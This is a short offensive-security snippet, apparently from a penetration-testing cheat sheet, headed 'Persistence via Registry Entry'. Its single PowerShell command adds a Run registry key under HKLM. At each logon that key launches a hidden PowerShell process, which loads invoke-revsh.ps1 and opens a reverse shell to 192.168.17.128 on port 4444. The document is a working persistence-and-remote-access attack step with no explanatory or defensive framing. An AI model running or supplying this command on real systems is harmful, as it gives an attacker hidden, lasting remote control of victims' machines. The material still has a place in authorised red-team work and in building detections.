Persistence via Registry Entry

~~~PowerShell
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persistent /t REG_SZ /d "powershell.exe -windowstyle hidden -c \"Start-Process powershell.exe -windowstyle hidden 'import-module C:\Users\Admin\Desktop\invoke-revsh.ps1; invoke-revsh -reverse -ipaddress 192.168.17.128 -port 4444';exit\""
~~~

